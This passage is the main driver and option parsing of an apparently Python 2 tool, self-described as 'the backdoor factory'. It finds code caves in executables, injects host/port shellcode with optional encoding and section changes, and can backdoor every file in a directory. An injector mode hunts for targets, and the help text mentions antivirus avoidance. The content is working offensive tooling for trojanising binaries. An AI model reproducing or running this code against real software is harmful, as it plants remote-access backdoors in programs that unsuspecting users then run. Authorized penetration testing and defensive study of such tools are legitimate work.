                      help="Mandating that a new section be added to the "
                      "exe (better success) but less av avoidance")
    parser.add_option("-w", "--change_access", default=True,
                      dest="CHANGE_ACCESS", action="store_false",
                      help="This flag changes the section that houses "
                      "the codecave to RWE. Sometimes this is necessary. "
                      "Enabled by default. If disabled, the "
                      "backdoor may fail.")
    parser.add_option("-j", "--injector", default=False, dest="INJECTOR",
                      action="store_true",
                      help="This command turns the backdoor factory in a "
                      "hunt and shellcode inject type of mechinism. Edit "
                      "the target settings in the injector module.")
    parser.add_option("-u", "--suffix", default=".old", dest="SUFFIX",
                      action="store", type="string",
                      help="For use with injector, places a suffix"
                      " on the original file for easy recovery")
    (options, args) = parser.parse_args()

    verbose = options.VERBOSE
    change_access = options.CHANGE_ACCESS

    if options.INJECTOR is True:
        injector(options.SUFFIX, change_access, options.SHELL,
                 options.ENCODER, options.HOST, options.PORT,
                 options.NSECTION, options.ADD_SECTION, verbose)
        sys.exit()

    if options.CAVE is True:
        if not options.FILE:
            print "You must provide a file to look for caves (-f)"
            sys.exit()
        f = open(options.FILE, 'rb')
        fileItems = gather_file_info(options.FILE, 'None')
        print ("Looking for caves with a size of %s "
               "bytes (measured as an integer)"
               % options.SHELL_LEN)
        find_all_caves(fileItems, options.SHELL_LEN)
        sys.exit()

    if options.DIR:
        shellcode = set_shells(options.SHELL,
                               options.PORT,
                               options.HOST)

        dirlisting = os.listdir(options.DIR)
        print ("You are going to backdoor the following "
               "items in the %s directory:"
               % options.DIR)
        for item in dirlisting:
            print "     {0}".format(item)
        answer = raw_input("Do you want to continue? (yes/no) ")
        if 'yes' in answer.lower():
            for item in dirlisting:
                #print item
                print "*"*50
                options.FILE = options.DIR + '/' + item
                print ("backdooring file %s" % item)
                try:
                    output_file = output_options(options.FILE, options.OUTPUT)
                    result = do_thebackdoor(options.FILE,
                                            output_file,
                                            shellcode,
                                            options.NSECTION,
                                            options.ADD_SECTION,
                                            options.ENCODER)
                    if result is None:
                        print 'Continuing'
                        continue
                    else:
                        print ("File {0} is in current "
                               "directory".format(output_file))
                except Exception as e:
                    print str(e)
        else:
            print("Goodbye")

        sys.exit()

    if not options.FILE:
        parser.print_help()
        sys.exit(1)

    output_file = output_options(options.FILE, options.OUTPUT)
    shellcode = set_shells(options.SHELL, options.PORT, options.HOST)
    result = do_thebackdoor(options.FILE,
                            output_file,
                            shellcode,
                            options.NSECTION,
                            options.ADD_SECTION,
                            options.ENCODER)
    if result is True:
        print "File {0} is in current directory".format(output_file)
